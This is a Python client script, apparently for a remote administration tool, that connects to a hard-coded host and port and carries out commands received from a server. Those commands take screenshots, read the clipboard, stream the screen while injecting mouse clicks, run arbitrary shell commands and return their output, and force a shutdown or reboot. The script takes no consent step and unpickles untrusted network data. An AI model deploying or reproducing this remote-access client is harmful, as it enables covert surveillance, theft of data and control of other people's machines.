import socket
import os
import time
import subprocess
from mss import mss as mssclass
import mss.tools
import bz2
from PIL import Image
import pickle
import pyautogui

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
ip = '127.0.0.1'
port = 8000

pyautogui.FAILSAFE = False
s.connect((ip, port))
monitor = mssclass().monitors
WIDTH = monitor[0]['width']
HEIGHT = monitor[0]['height']


def recvlength():
    command_len = int.from_bytes(s.recv(1), byteorder='big')
    length = int.from_bytes(s.recv(command_len), byteorder='big')
    return length

def sendlength(data):
    size = len(data)
    size_len = (size.bit_length() + 7) // 8
    s.send(bytes([size_len]))

    size_bytes = size.to_bytes(size_len, 'big')
    s.send(size_bytes)

def getmouseevent():
    poslength = recvlength()
    pos = s.recv(poslength)
    pos = pickle.loads(pos)
    pyautogui.moveTo(pos[0], pos[1])
    if pos[2]:
        pyautogui.click(pos[0], pos[1])

s.send(b'Arnav')
while True:
    try:
        length = recvlength()
        message = s.recv(length)
        if message == b'screenshot':
            bounding_box = {'top': 0, 'left': 0, 'width': WIDTH, 'height': HEIGHT}
            sct = mssclass()
            sct_img = sct.grab(bounding_box)
            raw_bytes = mss.tools.to_png(sct_img.rgb, sct_img.size)
            sendlength(raw_bytes)
            s.sendall(raw_bytes)
        elif message == b'clipboard':
            try:
                contents = subprocess.check_output('xclip -selection clipboard -o', shell=True)
                sendlength(str(contents) if contents else 'Empty')
                s.send(str.encode(str(contents) if contents else 'Empty'))
            except:
                sendlength('Empty Clipboard')
                s.send(b'Empty Clipboard')
        elif message == b'shutdown':
            subprocess.call('shutdown now', shell=True)
        elif message == b'restart':
            subprocess.call('reboot', shell=True)
        elif message == b'custom':
            length = recvlength()
            command = s.recv(length)
            try:
                consoleoutput = subprocess.check_output(str(bytes.decode(command)), shell=True)
                sendlength(consoleoutput)
                s.sendall(consoleoutput)
            except:
                s.send(b'Command Not Found')
        elif message == b'sharescreen':
            dim = [WIDTH, HEIGHT]
            dim = pickle.dumps(dim)
            sendlength(dim)
            s.send(dim)
            bounding_box = {'top': 0, 'left': 0, 'width': WIDTH, 'height': HEIGHT}
            sct = mssclass()
            while True:
                if s.recv(1) == b'1':
                    break
                sct_img = sct.grab(bounding_box)
                img = Image.frombytes("RGB", sct_img.size, sct_img.bgra, "raw", "BGRX")
                raw_bytes = img.tobytes()
                sendlength(raw_bytes)
                s.sendall(raw_bytes)
                # disable getmouseevent() and sendMouseEvent() in server for for more fps
                getmouseevent()
    except ConnectionResetError:
        print("Server closed the connection")
        break